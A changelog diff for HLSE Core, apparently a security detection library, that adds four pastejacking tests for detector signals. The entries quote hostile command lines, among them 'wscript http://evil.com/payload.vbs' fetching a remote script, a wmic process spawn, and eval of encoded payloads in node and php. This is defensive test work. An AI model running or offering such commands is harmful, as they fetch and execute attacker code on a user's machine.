@@ -2,6 +2,20 @@
 
 All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
+## [0.9.48] — 2026-06-09
+
+### Added
+- **Supply chain: 4 new pastejacking tests** (GAP-AT — 21→25 tests):
+  - `test_paste_wscript_remote` — `wscript http://evil.com/payload.vbs`
+    → P8 LOLBin signal fires (wscript + http/vbs from GAP-AR).
+  - `test_paste_wmic_process` — `wmic process call create "cmd.exe"`
+    → P8 LOLBin fires (wmic process creation from GAP-AR).
+  - `test_paste_node_eval` — `node -e "require(...).exec()"` 
+    → P5 encoded payload fires (node -e from GAP-AR).
+  - `test_paste_php_eval` — `php -r 'eval(base64_decode(...))'`
+    → P5 encoded payload fires (php -r from GAP-AR).
+  Total structured tests: 354 → 358.
+
 ## [0.9.47] — 2026-06-09
 
 ### Added
